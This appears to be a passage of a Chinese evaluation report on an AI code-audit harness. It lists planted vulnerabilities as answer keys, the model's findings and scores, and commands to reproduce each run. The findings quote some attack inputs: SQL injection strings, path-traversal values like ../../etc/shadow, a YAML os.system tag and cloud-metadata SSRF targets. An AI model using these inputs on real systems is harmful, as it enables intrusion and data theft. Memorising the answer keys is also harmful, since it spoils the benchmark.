1. blocker — app/pool.py:24 `compute()` 在 `hits > 100` 时提前 return，跳过唯一会执行 `in_use -= 1` 的 `pool.release(conn)`（L26）。泄漏出函数作用域后无法被任何调用方归还，`in_use` 只增不减，且声明的 `size` 从未参与容量判断，属于不可恢复的计数泄漏。

2. warn — app/exporter.py:11 `open()` 未配 `with`/`try-finally`，L13-14 循环写入抛错时 L15 的 `close()` 不可达。

3. warn — app/exporter.py:14 CSV 字段裸拼接、未用 csv
```

**自己跑一遍**

```bash
cd backend
python -m harness -r examples\s2-resources-errors\repo \
  -g "审查这个仓库中的缺陷，重点是会导致错误行为、资源泄漏或安全问题的实现。逐文件检查，确认后记录发现。" \
  --out reports/s2-resources-errors.md --json reports/s2-resources-errors.json
```

网页界面里也可以：启动 `python -m harness.server --port 8765`，打开 <http://127.0.0.1:8765/>，在左侧空间栏选中该样本，在输入坞写明要求后回车。

---

<a id="s3-input-paths"></a>

### L3 进阶　`s3-input-paths`

- 考的能力：**完整背景（给出关注方向）**
- 审计根：`examples\s3-input-paths\repo`（标注文件 `labels.json` 在**审计根之外**，模型读不到）
- 规模：1 个文件 / 4 条标注
- 本次实测：8 轮 / 56s / 结束原因 `finished` / 缓存命中 80%
- 结果：召回 100%（4/4）　精确率 100%　F1 100%

**审计目标（提问原文）**

```text
审查这个仓库。用户可控的数据在进入文件系统、反序列化和外部请求之前，有没有做必要的校验与限制？请逐条给出结论。
```

**植入缺陷（答案）**

| 编号 | 位置 | 缺陷 |
|---|---|---|
| `PATH01-a` | `app/files.py:13` | name 未做基线校验，../ 可越出 BASE_DIR |
| `DESER01-a` | `app/files.py:20` | pickle 处理不可信数据等同任意代码执行 |
| `DESER02-a` | `app/files.py:25` | yaml.load 未指定 SafeLoader，可构造对象 |
| `SSRF01-a` | `app/files.py:30` | 未限制目标地址，可打内网与云元数据服务 |

规则基线命中 0 条，召回 0%（精确率 0%）。规则按模式匹配，**不读数据来源、不构造并发、不建权限模型** ——这正是 L3 以上样本规则全线为 0 的原因。

**模型实际报了什么（共 4 条）**

1. `app/files.py:13` [blocker] **read_upload 直接把文件名拼进路径，未做规范化与越界校验，可读任意文件**　`复核: hit`
   - name 完全来自调用方（docstring 写明「按文件名读取上传目录里的文件」），代码对其不做任何校验：既没有拒绝绝对路径、没有剔除 `..`，也没有用 realpath/commonpath 确认结果仍位于 BASE_DIR 之下，随后 L14 直接 open()。两条可利用路径：(1) 当 name 以 `/` 开头（如 `/etc/passwd`）时，os.path.join 的语义是丢弃前面的 BASE_DIR，返回绝对路径本身，等于绕开上传目录；(2) 当 name 形如 `../../etc/shadow` 时，拼接结果虽以 BASE_DIR 开头，但未被规范化，open 时由内核解析 `..` 逃逸出目录（BASE_DIR 为 /srv/uploads，向上三级即到根）。触发不需要任何特殊时序，只要该函数被请求处理路径调用即可读取进程可读的任意文件（含应用自身配置文件、凭
2. `app/files.py:20` [blocker] **load_profile 对用户提交的字节流直接 pickle.loads，构成反序列化 RCE**　`复核: hit`
   - blob 是「用户提交的会话快照」，属于完全外部可控的字节流，而 pickle.loads 会在反序列化过程中执行 payload 里指定的任意可调用对象与构造器（如 `!!python` 风格的 `__reduce__` 返回值，或 `os.system` / `subprocess` 一类的 callable），无需任何前置条件即可在服务进程权限下执行任意代码。这是不可逆危害（getshell / 读取进程内所有密钥），且触发不需要异常输入之外的任何条件。
3. `app/files.py:30` [blocker] **fetch_avatar 用用户给定的 URL 直接发外部请求，无协议/主机白名单，可被用作 SSRF**　`复核: hit`
   - url 由用户提供（docstring「按用户给出的地址抓取头像」），代码未做任何限制：没有校验 scheme（ftp/gopher/file 等非 http 协议同样会被 requests 接受）、没有主机名/IP 黑名单或白名单、没有解析后 IP 是否属于内网网段的判断。requests 默认 allow_redirects=True，即使上游加了域名白名单也能被 302 跳转绕过。由于 L31 把响应体原样返回给调用方，这不是盲 SSRF：攻击者能直接读到内网服务的响应，典型目标是云元数据服务（169.254.169.254 的凭据接口）与 localhost 上的管理端口，从而窃取云凭证或探测内网拓扑。附带问题：response.content 会把响应体一次性读入内存且没有大小上限，配合一个返回超大响应或慢速持续发送的地址即可造成内存/连接占用。已做的唯一限制是 timeout=
4. `app/files.py:25` [warn] **load_settings 用 yaml.load 且未指定 Loader，解析外部 YAML 依赖不安全的默认加载器**　`复核: hit`
   - text 是「用户上传的 YAML 配置」，属于外部输入，而 yaml.load 在此处没有传 Loader 参数，安全性完全取决于安装的 PyYAML 版本：PyYAML < 5.1 时未指定 Loader 会退回完整的不安全 Loader，`!!python/object/apply:os.system` 之类的标签可直接执行命令；5.1~5.3.1 的默认 FullLoader 也可被 CVE-2020-14343 一类 payload 绕过；即便在已修复的版本上，标准库也会发出「default Loader is unsafe」的 YAMLLoadWarning。也就是说，这段代码要么存在真实的 RCE，要么至少依赖一个官方明确标注为不安全的默认值，属于不该保留的写法。因为仓库内没有任何依赖声明文件（只有 app/files.py 一个文件），无法确认实际安装版本，所以按「需特定版

**模型自己的收尾总结（原文摘录）**

```text
## 审计范围

工作区只有一个文件 `app/files.py`（31 行，`list_files` 确认），其中四个函数构成四个「用户可控数据 → 危险汇聚点」的入口。仓库内**没有**任何调用点、依赖声明（requirements/pyproject）、测试或配置，因此每条结论都是针对该函数契约（docstring 明确写明输入来自用户）的判定，实际可达性取决于上层调用方——这一点我在每条发现里都如实标了。

## 逐条结论（对应「文件系统 / 反序列化 / 外部请求 / 数据解析」四项检查）

| # | 入口 | 校验现状 | 级别 |
|---|---|---|---|
| 1 | `read_upload(name)` L13-14 → 文件系统 | 无 | blocker |
| 2 | `load_profile(blob)` L20 → 反序列化 | 无 | blocker |
| 3 | `fetch_avatar(url)` L30-31 → 外部请求 | 无 | blocker |
| 4 | `load_settings(text)` L25 → YAML 反序列化 | 无（依赖默认 Loader） | warn |

1. **`read_upload`（app/files.py:13）**——`os.path.join(BASE_DIR, name)
```

**自己跑一遍**

```bash
cd backend
python -m harness -r examples\s3-input-paths\repo \
  -g "审查这个仓库。用户可控的数据在进入文件系统、反序列化和外部请求之前，有没有做必要的校验与限制？请逐条给出结论。" \
  --out reports/s3-input-paths.md --json reports/s3-input-paths.json
```

网页界面里也可以：启动 `python -m harness.server --port 8765`，打开 <http://127.0.0.1:8765/>，在左侧空间栏选中该样本，在输入坞写明要求后回车。

---

<a id="s4-concurrency"></a>

### L4 进阶　`s4-concurrency`

- 考的能力：**诊断型（先推根因）**
- 审计根：`examples\s4-concurrency\repo`（标注文件 `labels.json` 在**审计根之外**，模型读不到）
- 规模：1 个文件 / 4 条标注
- 本次实测：10 轮 / 120s / 结束原因 `finished` / 缓存命中 85%
- 结果：召回 75%（3/4）　精确率 75%　F1 75%

**审计目标（提问原文）**

```text
先说明这些函数在什么样的线程交错顺序下会出错，再逐个确认实际实现是否存在该问题。
```

**植入缺陷（答案）**

| 编号 | 位置 | 缺陷 |
|---|---|---|
| `CONC01-a` | `app/cache.py:15` | check-then-act 非原子，并发首次调用会建出多个实例 |
| `CONC02-a` | `app/cache.py:22` | 判断与写入之间是竞态窗口，可能重复建并覆盖 |
| `CONC03-a` | `app/cache.py:32` | 读 len 与 add 之间无锁，两个线程会拿到同一个槽位 |
| `CONC04-a` | `app/cache.py:38` | 读-改-写非原子，并发下会丢更新 |

规则基线命中 0 条，召回 0%（精确率 0%）。规则按模式匹配，**不读数据来源、不构造并发、不建权限模型** ——这正是 L3 以上样本规则全线为 0 的原因。

**模型实际报了什么（共 4 条）**

1. `app/cache.py:20` [blocker] **get_or_create 的 check-then-act 无锁，两个线程会各自构建一份值，缓存被后写者覆盖且返回值不一致**　`复核: hit`
   - 出错所需的交错：两个线程（或多请求线程）对同一个 key 同时调用 get_or_create。 1) 线程 A 在 L22 判断 `key not in _registry` 为真（此时 key 尚未写入）； 2) 线程 B 也在 L22 判断为真 —— 这两步之间没有锁，也没有「占位」写入，A 尚未执行到 L23； 3) A 执行 L23 `_registry[key] = factory()`，B 也执行 L23 `_registry[key] = factory()`。 结果：factory 被重复执行两次（若 factory 持有连接/文件句柄/单例资源，等于重复申请，前一份失去引用、永远不会被释放）；L24 两个线程返回的可能是两份不同的对象，即「同一 key 返回不同实例」；注册表里最终只留下后写入的那一份，先返回给 A 的那份成为无人引用的孤儿。这是典型的 check-th
2. `app/cache.py:15` [warn] **ConfigCache.instance 的无锁惰性单例：两个线程可能各得到一个实例，instance() 不再全局唯一**　`复核: hit`
   - 出错所需的交错：线程 A 在 L15 判断 `cls._instance is None` 为真，随后在 L16 赋值前被切走；线程 B 也判断为真，并完成 L16 赋值与 L17 返回对象 B；A 恢复后再次执行 L16，把 cls._instance 覆盖为对象 A 并返回 A。 结果：B 拿到的实例从此不再是 `instance()` 的返回值，缓存的「唯一实例」前提被破坏 —— 后续 snapshot() 之类的状态读取可能落在被遗弃的那个实例上。触发条件：首次调用 instance() 的那一刻有并发（进程启动/首批并发请求），之后由于已有实例通常不再复现，属于「特定时序才触发、影响可控」。 注意与上一条区分：这里是重复构造，不是数据丢失。
3. `app/cache.py:29` [warn] **allocate_slot 用 len(used) 推槽位且判断与写入非原子：并发下会分配重复槽位，且槽位满时仍可能被分配**　`复核: placement`
   - 出错所需的交错：两个线程并发调用 allocate_slot(used, total)。 1) A 在 L29 读出 `slot = len(used)`（例如 0）； 2) B 在 A 尚未执行 L32 前也读出 `slot = len(used)`（仍为 0）； 3) 两者都通过 L30 的边界检查，A 执行 L32 把 0 加入集合、B 也把 0 加入集合。 结果：两个调用者拿到同一个槽位 0 —— 调用方会认为各自独占槽位，实际发生覆盖/冲突（数据错位）；同时集合只增加了一个元素，槽位被永久泄漏。 边界场景：`used = {0,1}`、total = 3 时，A 与 B 都读到 slot = 2，L30 的 `2 >= 3` 为假、都不抛错，于是两个线程都被分配了本应是最后一个的槽位 2，total 上限被突破。 触发条件：同一 set/limit 上的并发分配，即通常的使用方式
4. `app/cache.py:38` [warn] **record_hit 的无锁「读-改-写」会丢计数，且与 snapshot 上加锁的读取口径不一致**　`复核: hit`
   - 出错所需的交错：两个线程并发执行 `hits = hits + 1`。 1) A 读到 _counter['hits']（例如 41）； 2) B 也读到 41（A 尚未写回）； 3) A 写回 42，B 写回 42。 结果：两次命中只被记录为一次，计数永久偏少。触发条件：任何多线程累计命中数的场景，命中越频繁丢失越多。副作用同样是「显式失败缺失」：计数器偏小不会报错，只会静默失真。 附带的口径问题：snapshot() 在 L43 用 `with _lock:` 读 _counter，看起来像有并发保护，但唯一的写者 record_hit 从不持锁（grep 确认 _lock 只出现在 L7 与 L43），因此这把锁提供不了任何互斥语义，反而给出「计数受保护」的错误印象。

**漏报**

- `CONC03-a` @ `app/cache.py:32` — 读 len 与 add 之间无锁，两个线程会拿到同一个槽位
  - 模型在 `app/cache.py:29` 报了一处，相距 3 行：allocate_slot 用 len(used) 推槽位且判断与写入非原子：并发下会分配重复槽位，且槽位满时仍可能被分配 → **大概率是同一处缺陷的位置分歧**

**多报（含位置分歧的判断）**

- `app/cache.py:29` [warn] allocate_slot 用 len(used) 推槽位且判断与写入非原子：并发下会分配重复槽位，且槽位满时仍可能被分配
  - 最近标注：`CONC03-a` @ `app/cache.py:32`，相距 3 行 → **同一处缺陷的位置分歧**（非误报）

**模型自己的收尾总结（原文摘录）**

```text
审计范围：工作区仅一个文件 app/cache.py（44 行，即本次「并发」样本的审计根），git 工作区在这条路径上没有改动，因此按整份文件审计。全文 44 行已读全，并用 grep 交叉确认了 _lock / _counter / _registry / _instance 的全部出现位置（共 18 处）。

关键结构事实（后续所有结论都由此推出）：文件导入了 threading 并定义了 _lock（L7），但 grep 显示 _lock 只在 L43 的 snapshot() 里被使用一次；registry、counter、singleton 三个共享可变状态的全部读写路径都没有任何同步。

逐函数确认的「线程交错 → 实际实现是否命中」：
1) get_or_create（L20-24）— blocker。判断 `key not in _registry`（L22）与写入 `_registry[key] = factory()`（L23）非原子，两线程可同时判定为真并各构造一次；factory 重复执行、L24 可能返回两份不同对象、后写者覆盖前值。正常使用（同 key 首次填充）即可触发，故定 blocker。
2) ConfigCache.instance（L14-17）— warn。L15 判断与 L16 赋值之间无锁，两线程可各得到一个实例，instance()
```

**自己跑一遍**

```bash
cd backend
python -m harness -r examples\s4-concurrency\repo \
  -g "先说明这些函数在什么样的线程交错顺序下会出错，再逐个确认实际实现是否存在该问题。" \
  --out reports/s4-concurrency.md --json reports/s4-concurrency.json
```

网页界面里也可以：启动 `python -m harness.server --port 8765`，打开 <http://127.0.0.1:8765/>，在左侧空间栏选中该样本，在输入坞写明要求后回车。

---

<a id="s5-boundaries"></a>

### L5 高级　`s5-boundaries`

- 考的能力：**诊断型（先立前提）**
- 审计根：`examples\s5-boundaries\repo`（标注文件 `labels.json` 在**审计根之外**，模型读不到）
- 规模：1 个文件 / 6 条标注
- 本次实测：11 轮 / 143s / 结束原因 `finished` / 缓存命中 87%
- 结果：召回 100%（6/6）　精确率 100%　F1 100%

**审计目标（提问原文）**

```text
先推导每个函数对调用方隐含的前提（区间开闭、页码基准、单位与取值范围），再判断实现有没有落实这些前提。
```

**植入缺陷（答案）**

| 编号 | 位置 | 缺陷 |
|---|---|---|
| `BOUND01-a` | `app/limits.py:11` | 两端皆闭，恰好落在边界的事件被相邻两个窗口各计一次 |
| `BOUND02-a` | `app/limits.py:16` | hits 可大于 LIMIT，此处会返回负数并直接被展示 |
| `BOUND03-a` | `app/limits.py:21` | 页码从 1 起时应为 (page-1)*size，否则首屏被整页跳过 |
| `BOUND04-a` | `app/limits.py:26` | whole 为 0 时抛 ZeroDivisionError，调用方未做防护 |
| `BOUND05-a` | `app/limits.py:31` | 含尾应再 +1，跨月/跨年时同样少算一天 |
| `BOUND06-a` | `app/limits.py:36` | 未对 24 取模也未归一化，跨日会算出不存在的小时 |

规则基线命中 0 条，召回 0%（精确率 0%）。规则按模式匹配，**不读数据来源、不构造并发、不建权限模型** ——这正是 L3 以上样本规则全线为 0 的原因。

**模型实际报了什么（共 6 条）**

1. `app/limits.py:21` [blocker] **page_offset 与文档声明的「页码从 1 开始」不符，第 1 页会被整页跳过**　`复核: hit`
   - docstring 明确约定 page 以 1 为基准（L20），因此对调用方的隐含前提是「offset = (page-1)*size，page=1 时 offset=0」。实现直接返回 page * size，等价于按 0 基准页码计算。调用方按文档传 page=1,size=20 时得到 offset=20，第 1~20 条记录永远不会出现在任何页里（第 1 页返回第 21~40 条），属于静默丢数据；传 page=0 才能拿到首页，但 0 不在声明的取值域内。
2. `app/limits.py:31` [warn] **days_between 声明「含首尾两天」但实现是半开区间，结果恒少 1**　`复核: hit`
   - L30 的契约是闭区间计数（含首尾两天），隐含前提为 start 与 end 两天都要计入。实现用 `(end - start).days`，只算端点之差：同一天返回 0（按契约应为 1），1/1→1/3 返回 2（按契约应为 3）。任何按此函数计费、计算时长或判断「是否超过 N 天」的调用方都会系统性偏小一天。
3. `app/limits.py:36` [warn] **quota_key 的时区换算被截断且未归一化，非整小时时区的配额桶边界错位**　`复核: hit`
   - docstring 声明「按客户端时区构造配额键」，隐含前提是 hour 落在 0~23、日期随客户端时区走、分钟偏移不能丢。实现有两处未落实：(1) `minutes_west // 60` 直接丢掉分钟部分（Python 是向下取整，-330//60 = -6，-270//60 = -5），对 UTC+5:30 / +9:30 / -3:30 这类非整小时时区，配额桶的切换点会被整体平移 30 分钟（本地 :30 才重置，而非本地整点）；(2) `hour` 不做 `% 24` 归一化、`strftime("%Y-%m-%d")` 用的是未平移的 UTC 日期，因此键里会出现 `-8`、`25` 这种非法小时值，且日期与客户端本地日期不一致。基于 L5/L6 的配额语义（每窗口 LIMIT 次），桶边界错位意味着本地整点附近的请求会被记到相邻桶，限流在该时刻少算/多算。
4. `app/limits.py:26` [warn] **percentage 未落实「whole 非 0」这一隐含前提，whole=0 时抛 ZeroDivisionError**　`复核: hit`
   - `part / whole * 100` 的隐含前提是 whole != 0。函数没有任何防护，调用方在「总数为 0」的常见场景（空样本、空队列统计）会直接抛 ZeroDivisionError 而不是拿到 0 或 None。此外函数也不声明 part/whole 的取值范围与返回值域（part > whole 时会返回 >100 的值），调用方无法据签名判断。
5. `app/limits.py:16` [note] **remaining 未声明/约束返回值下界，hits 超过 LIMIT 时返回负数**　`复核: hit`
   - docstring 只说「还剩多少配额」，未声明 hits 的取值域，调用方会自然地把它当作「非负的剩余量」直接展示或比较（如 `if remaining(hits) == 0`）。实现无下界裁剪，当 hits 超过 LIMIT（并发下窗口内计数可能超过上限，或 hits 来自累计值）时返回负数，这类调用方会拿到 -20 这种越界值：以 `== 0` 判断「配额耗尽」会永远不成立。
6. `app/limits.py:11` [note] **in_window 含两端闭区间且不校验参数次序，边界事件会被相邻窗口重复计入**　`复核: hit`
   - docstring 只说「判断事件是否落在窗口内」，没有声明区间开闭；实现两端都用 `<=`，即闭区间 [start, now]。对本文件同级的限流语义（WINDOW_SECONDS=60、LIMIT=100，见 L5-L6）而言，隐含前提通常是「窗口左闭右开」——否则落在窗口右端点 ts == now 上的事件会被相邻两个窗口各计一次，窗口切换瞬间的计数偏大 1，可能让限流提前触发。另外函数不校验 start <= now：参数次序颠倒或 start 晚于 now 时不会报错，而是静默地对所有事件返回 False（看起来像「窗口内没有事件」），把配置错误伪装成空结果。

**模型自己的收尾总结（原文摘录）**

```text
审查范围：工作区唯一文件 app/limits.py（37 行，6 个函数），list_files + grep 确认无其它模块、无调用点，故按「函数声明的契约 → 调用方由契约推出的前提 → 实现是否落实」逐函数核对。

主要发现（6 条，1 阻断 / 3 警告 / 2 建议）：
1. blocker — page_offset (L21)：docstring 声明页码从 1 开始，但返回 page*size 而非 (page-1)*size。调用方按文档传 page=1 时 offset=20，第 1~20 条记录在任何页里都取不到，属静默丢数据；page=0 才等价首页，而 0 不在声明取值域内。
2. warn — days_between (L31)：docstring 声明「含首尾两天」（闭区间语义），实现是端点差 (end-start).days。同日返回 0、1/1→1/3 返回 2，比契约恒少 1。
3. warn — quota_key (L36-37)：时区换算 minutes_west//60 丢掉分钟位（-330//60=-6），UTC+5:30/+9:30/-3:30 这类非整小时时区的配额桶边界整体平移 30 分钟；hour 不做 %24 归一化、日期用未平移的 UTC 日期，会产生 "-8" 这类非法小时值且日期与客户端本地日期不一致。
4. war
```

**自己跑一遍**

```bash
cd backend
python -m harness -r examples\s5-boundaries\repo \
  -g "先推导每个函数对调用方隐含的前提（区间开闭、页码基准、单位与取值范围），再判断实现有没有落实这些前提。" \
  --out reports/s5-boundaries.md --json reports/s5-boundaries.json
```

网页界面里也可以：启动 `python -m harness.server --port 8765`，打开 <http://127.0.0.1:8765/>，在左侧空间栏选中该样本，在输入坞写明要求后回车。

---

<a id="s6-authz-logic"></a>

### L6 高级　`s6-authz-logic`

- 考的能力：**诊断型（先建模型）**
- 审计根：`examples\s6-authz-logic\repo`（标注文件 `labels.json` 在**审计根之外**，模型读不到）
- 规模：1 个文件 / 4 条标注
- 本次实测：7 轮 / 61s / 结束原因 `finished` / 缓存命中 82%
- 结果：召回 75%（3/4）　精确率 60%　F1 67%

**审计目标（提问原文）**

```text
先建立这个服务的权限模型与订单状态机，再逐一判断实现有没有落实它。重点是：谁能看到什么、哪些状态转换是允许的。
```

**植入缺陷（答案）**

| 编号 | 位置 | 缺陷 |
|---|---|---|
| `AUTHZ01-a` | `app/orders.py:12` | 只按 order_id 查询，未校验 order 归属（越权读取他人订单） |
| `AUTHZ02-a` | `app/orders.py:19` | 只拦「已发货」，已退款/已完成的订单仍可取消并触发二次退款 |
| `AUTHZ03-a` | `app/orders.py:25` | 全局权限直接放行，静默覆盖了 CLIENT_DENY 里配的逐 client 拒绝 |
| `AUTHZ04-a` | `app/orders.py:30` | 未校验 amount 是否超过实付金额，也未校验是否已退过款 |

规则基线命中 0 条，召回 0%（精确率 0%）。规则按模式匹配，**不读数据来源、不构造并发、不建权限模型** ——这正是 L3 以上样本规则全线为 0 的原因。

**模型实际报了什么（共 5 条）**

1. `app/orders.py:12` [blocker] **get_order 完全忽略 user_id，任何用户可读取任意订单**　`复核: hit`
   - get_order 的签名声明了调用者身份 user_id（L9），但函数体只做 `ORDERS.get(order_id)` 后直接返回（L11-L12），既没有校验订单归属，也没有调用同文件里的 can_view 做 client 级可见性判定。只要知道 order_id，任意 user_id 都能拿到订单详情，越权读取无需任何特殊条件。另外 L11 用 dict.get 而非下标，订单不存在时返回 None，调用方（或 HTTP 层）会把它当成「查到订单」继续处理，进而在后续 `order["..."]` 处触发 TypeError；两种返回语义（不存在 vs 无权限）也没有区分。
2. `app/orders.py:22` [blocker] **can_view 定义了权限模型但全仓无任何调用点，判定未接入读写路径**　`复核: key_gap`
   - can_view 是文件里唯一的权限判定入口（L22-L26），但 grep 全仓 `can_view` 只命中这一处定义，get_order / cancel / refund 三个数据入口都没有调用它。也就是说模块声明了「谁能看到什么」的模型，却没有任何一条路径落实它，权限判定形同虚设。此外该实现是默认放行语义：L26 `return client_id not in CLIENT_DENY.get(user_id, ())`，任何未在 CLIENT_DENY 中登记的用户对未登记 client 一律返回 True；由于 CLIENT_DENY/VIEW_PERMISSIONS 在文件里初始化为空字典（L4-L5）且没有任何写入点，当前状态下 can_view 对任意 (client_id, user_id) 组合恒为 True。（`not in` 与 CLIENT_DENY 这个「拒
3. `app/orders.py:16` [blocker] **cancel 不校验 user_id，任意用户可取消他人订单**　`复核: key_gap`
   - cancel 的签名同样接收 user_id（L14），但函数体（L16-L20）只按 order_id 取单后直接改状态，从未使用 user_id，也没有订单归属/角色校验。任何持 order_id 的调用者都能把他人订单置为 cancelled，属于越权写操作。与 get_order 一样，L16 用 dict.get，订单不存在时 order 为 None，随后 L17 `order["status"]` 直接抛 TypeError 而不是明确报错。
4. `app/orders.py:17` [warn] **cancel 的状态守卫只挡 shipped，重复取消与终态订单仍可迁移**　`复核: hit`
   - cancel 的状态守卫只覆盖 shipped 一个状态（L17-L18），其余状态一律放行到 cancelled。由此 `cancelled` 订单可以再次取消、已完成/已退款订单也能被取消，重复取消会覆盖已有状态并让调用方误以为发生了新的状态迁移。文件里没有任何状态常量或允许迁移表，实际生效的「状态机」就是「非 shipped 即变为 cancelled」，缺少对源状态集合的约束。
5. `app/orders.py:30` [blocker] **refund 未校验金额范围与累计上限，可为负或超额退款**　`复核: hit`
   - refund 只做 `order["refunded_cents"] + amount` 累加（L30），既不校验 amount 的符号也不校验累计退款是否超过订单金额：传入负数会让 refunded_cents 变小（等价于冲销已发生的退款），传入超大值可使累计退款远超订单总额。同时 L30 假设 `refunded_cents` 键一定存在，键缺失时抛 KeyError。此外该方法只接收 order 与 amount，不接受调用者身份，函数内部无任何权限/归属校验，任意调用方都能对任意订单纯发起退款；退款这一资金操作与 can_view 权限体系也没有任何连接点。

**漏报**

- `AUTHZ03-a` @ `app/orders.py:25` — 全局权限直接放行，静默覆盖了 CLIENT_DENY 里配的逐 client 拒绝
  - 模型在 `app/orders.py:22` 报了一处，相距 3 行：can_view 定义了权限模型但全仓无任何调用点，判定未接入读写路径 → **大概率是同一处缺陷的位置分歧**

**多报（含位置分歧的判断）**

- `app/orders.py:22` [blocker] can_view 定义了权限模型但全仓无任何调用点，判定未接入读写路径
  - 最近标注：`AUTHZ02-a` @ `app/orders.py:19`，相距 3 行 → **同一处缺陷的位置分歧**（非误报）
- `app/orders.py:16` [blocker] cancel 不校验 user_id，任意用户可取消他人订单
  - 最近标注：`AUTHZ02-a` @ `app/orders.py:19`，相距 3 行 → **同一处缺陷的位置分歧**（非误报）

**模型自己的收尾总结（原文摘录）**

```text
审计对象是 app/orders.py（工作区唯一文件，31 行，已全文读完）。git diff 呈现的是外层 harness 仓（backend/eval、backend/tests）的改动，不在被审范围内，已排除。

先建立的模型与实现对照结论：
1) 权限模型：文件里有唯一判定入口 can_view（L22-L26），语义是「VIEW_PERMISSIONS 为 global 则放行，否则看是否在 CLIENT_DENY 拒绝名单里」。但 grep 全仓 can_view 只命中定义本身，get_order / cancel / refund 三个数据入口都没有调用它，权限判定完全未接入读写路径。
2) 订单状态机：实际生效的规则就是 cancel 里的「status == shipped 则拒绝，否则置为 cancelled」（L17-L19），没有状态常量、没有允许迁移表。

据此确认 5 个缺陷（4 blocker / 1 warn）：
- blocker：get_order 接收 user_id 却完全不用（L9-L12），任意用户凭 order_id 可读任意订单；订单不存在时返回 None 而非报错。
- blocker：can_view 零调用点，权限模型没有落到任何路径上。
- blocker：cancel 同样不使用 user_id（L14-L20），任意用
```

**自己跑一遍**

```bash
cd backend
python -m harness -r examples\s6-authz-logic\repo \
  -g "先建立这个服务的权限模型与订单状态机，再逐一判断实现有没有落实它。重点是：谁能看到什么、哪些状态转换是允许的。" \
  --out reports/s6-authz-logic.md --json reports/s6-authz-logic.json
```

网页界面里也可以：启动 `python -m harness.server --port 8765`，打开 <http://127.0.0.1:8765/>，在左侧空间栏选中该样本，在输入坞写明要求后回车。

---

<a id="s7-crossfile-flow"></a>

### L7 专家　`s7-crossfile-flow`

- 考的能力：**定位型（只给位置，不给缺陷描述）**
- 审计根：`examples\s7-crossfile-flow\repo`（标注文件 `labels.json` 在**审计根之外**，模型读不到）
- 规模：1 个文件 / 2 条标注
- 本次实测：7 轮 / 40s / 结束原因 `finished` / 缓存命中 86%
- 结果：召回 100%（2/2）　精确率 67%　F1 80%

**审计目标（提问原文）**

```text
审查 app/repository.py 里的 query 与 export 两个方法。
```

**植入缺陷（答案）**

| 编号 | 位置 | 缺陷 |
|---|---|---|
| `FLOW001-a` | `app/repository.py:12` | tenant/kind 源自 HTTP 查询参数，经 service 透传至此拼进 SQL |
| `FLOW002-a` | `app/repository.py:19` | 表名同样来自请求参数，且无法参数化，必须走白名单校验 |

规则基线命中 2 条，召回 100%（精确率 100%）。规则按模式匹配，**不读数据来源、不构造并发、不建权限模型** ——这正是 L3 以上样本规则全线为 0 的原因。

**模型实际报了什么（共 5 条）**

1. `app/repository.py:12` [blocker] **query 用字符串拼接 tenant/kind，存在 SQL 注入与跨租户数据泄漏**　`复核: hit`
   - SQL 由 `"SELECT * FROM reports WHERE tenant = '" + tenant + "' AND kind = '" + kind + "'"` 拼接而成，tenant/kind 未做任何转义或参数化。两者都直接来自 HTTP 查询参数（app/handler.py:8-9 `request.args.get`），因此外部可控。传入 tenant=`' OR '1'='1`、kind=`' OR '1'='1` 会让 WHERE 恒真，返回所有租户的全部报表，破坏多租户隔离；也可用 `' UNION SELECT ...` 之类读取其他表。sqlite3 的 execute 虽然只执行单条语句，挡不住这种注入。
2. `app/repository.py:18` [blocker] **export 直接把 table 拼进 SQL，表名可被注入**　`复核: hit`
   - `self.conn.execute("SELECT * FROM " + table)` 未对 table 做白名单校验，table 来自 POST 请求体（app/handler.py:15 `request.json.get("table", "")` → service.py:16）。攻击者可用 `reports WHERE 1=1 UNION SELECT ...` 之类的表名片段读取任意表内容并写入导出文件，绕过 query 上的租户过滤。表名虽然不能参数化，但必须用白名单或对 sqlite_master 中的表名做存在性校验。
3. `app/repository.py:17` [blocker] **export 的 path 完全由请求方指定，构成任意文件写入**　`复核: key_gap`
   - `open(path, "w", encoding="utf-8")` 中的 path 未做任何限制或归一化，直接来自请求体（app/handler.py:16 `request.json.get("path", "/tmp/export.txt")`）。调用 `/report/export` 的客户端可以让服务进程以自身权限覆盖任意可写文件（例如覆盖配置、日志或应用源码），且写入内容是 `str(row)` 形式的数据库内容，可能造成数据外泄到任意路径。触发条件仅是调用该接口并自行指定 path，无需其他前置条件。
4. `app/repository.py:20` [warn] **export 返回值恒为 0，上层因此永远上报 rows=0**　`复核: key_gap`
   - docstring 声明「把整表导出到指定路径」，返回类型为 int，但函数体从未统计行数，L20 无条件 `return 0`。上层 app/service.py:16-17 把这个返回值当作行数放进响应 `{"rows": rows, "path": path}`，所以无论导出了 0 行还是 10 万行，接口都返回 rows=0，调用方据此判断导出结果会得到错误结论。触发条件是任意一次正常导出，属于必现的逻辑错误。
5. `app/repository.py:8` [warn] **连接只在 __init__ 创建，query/export 均无释放路径**　`复核: partial`
   - __init__ 里 `sqlite3.connect("reporting.db")` 建立连接，但整个仓库（app/ 三个文件）没有任何 `close()`、`with` 上下文或 `__del__`，grep `close|__enter__` 零命中。handler.py:10 与 handler.py:17 每次请求都新建 `ReportService()`→`Repository()`，随即被丢弃，于是每次 query/export 调用都泄漏一个 sqlite 连接（含文件描述符），高频访问下会耗尽 fd 并报 "unable to open database file"。触发条件是持续调用这两个接口，属于会累积的真实资源泄漏，只是不如前三个缺陷紧急。

**多报（含位置分歧的判断）**

- `app/repository.py:8` [warn] 连接只在 __init__ 创建，query/export 均无释放路径
  - 最近标注：`FLOW001-a` @ `app/repository.py:12`，相距 4 行 → **同一处缺陷的位置分歧**（非误报）

**冗余（重复报告同一处缺陷）**

- `app/repository.py:17` [blocker] export 的 path 完全由请求方指定，构成任意文件写入
- `app/repository.py:20` [warn] export 返回值恒为 0，上层因此永远上报 rows=0

> 冗余不计入精确率分子分母 —— 重复描述同一缺陷是啰嗦，不是报错。

**模型自己的收尾总结（原文摘录）**

```text
审查范围为 app/repository.py 的 query 与 export 两个方法，并借助 app/service.py、app/handler.py 追踪了完整调用链（数据入口是 HTTP 请求参数/请求体）。用 grep 验证了连接释放路径确实缺失。工作区 diff 仅涉及 backend/eval 评测集布局，与目标文件无关，未纳入。

共记录 5 条发现：3 个 blocker —— query 的 tenant/kind 字符串拼接导致 SQL 注入与跨租户越权读取（repository.py:12）；export 的 table 无白名单校验导致表名注入（L18）；export 的 path 由调用方任意指定导致任意文件写入/覆盖（L17）。2 个 warn —— export 恒返回 0 使上层 rows 永远为 0（L20）；sqlite 连接创建后无任何关闭点、每请求新建实例造成 fd 泄漏（L8）。

